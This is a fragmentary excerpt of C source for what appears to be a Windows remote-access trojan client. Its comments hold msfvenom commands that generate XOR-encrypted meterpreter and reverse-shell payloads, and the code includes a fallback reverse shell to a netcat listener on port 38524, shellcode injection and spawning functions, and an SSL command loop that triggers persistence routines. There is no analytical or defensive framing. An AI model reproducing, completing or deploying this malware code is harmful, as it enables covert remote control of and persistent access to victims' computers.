...
int UseFallBackShell = 0; //Disabled by default (Uses TCP), since with multiple clients may be obnoxious. If you want the client to start a fallback shell, set this to 1 (The server currently won't have to listen using 'nc -lvnp 38524')
...
//msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 --platform windows -a x64 -f c -v ShellcodeX64
//msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -f c --encrypt xor --encrypt-key "P" -v ShellcodeSpawnNetcat
//msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=38524 -f c --encrypt xor --encrypt-key "P" -v FallBackShell
...
DWORD Inject64(LPVOID Parameter)
{
	BOOL CreateProc = 0;
	STARTUPINFOW si = { 0 };
...
DWORD SpawnNetcatShell(LPVOID Parameter)
{
	int i = 0;
...
DWORD FallBackConnection(LPVOID Parameter)
{
	int i = 0;
...
void Run(SSL_CTX *Context, char *NewServerIP)
{
	...
	while (1)
	{
		...
		{
			MaintainPersistence4(ssl);
			goto redo;
		}

		else if (strncmp(ReceiveBuffer, "persistence5", 12) == 0)
		{
			MaintainPersistence5(ssl);
			goto redo;
		}
